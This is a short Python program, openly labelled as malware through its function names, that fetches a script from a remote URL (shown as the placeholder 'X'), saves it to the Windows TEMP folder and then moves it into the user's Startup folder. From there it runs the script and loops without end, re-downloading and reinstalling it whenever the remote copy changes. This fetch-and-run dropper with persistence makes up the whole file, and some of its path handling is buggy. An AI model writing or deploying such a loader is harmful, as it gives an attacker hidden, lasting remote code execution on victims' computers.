import requests, os, subprocess, shutil, string, random


STARTUP = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
TEMP = os.getenv('TEMP')
URL = 'X'

PATH = {
    'script_path' : TEMP + '\\' + 'main.py',
    'startup_path' : STARTUP + '\\' + 'main.py'
        }

def check_if_same():
    
    with open(STARTUP + '\\' + 'main.py', 'r')as FILE:
        
        CONTENT = FILE.readline()
        CONTENT = CONTENT.splitlines()[0]
    
    _CONTENT_ = get_script().splitlines()[0]
    
    if _CONTENT_ == CONTENT:
        pass
    
    else:
        main()

def get_script():
    return requests.get(URL).text

def run_malware():
    subprocess.run(["python", PATH['startup_path']])

def install():
    
    with open(PATH['script_path'] ,'w') as FILE:
        FILE.write(get_script())

def delete_existing_file():
    
    for _PATH_ in PATH:
        
        if os.path.exists(_PATH_):
            os.remove(_PATH_)
        
        else:
            pass

def on_startup(): 
    try:
        shutil.move(PATH['script_path'], PATH['startup_path'])
    except:
        shutil.move(PATH['script_path'], find_malware())    

def find_malware():
    
    for FILE in os.listdir(TEMP):
        
        if FILE == 'main.py':
            return os.path.join(TEMP, FILE)   

def main():
    
    delete_existing_file()
    install()
    on_startup()
    run_malware()


main()
while True:
    check_if_same()


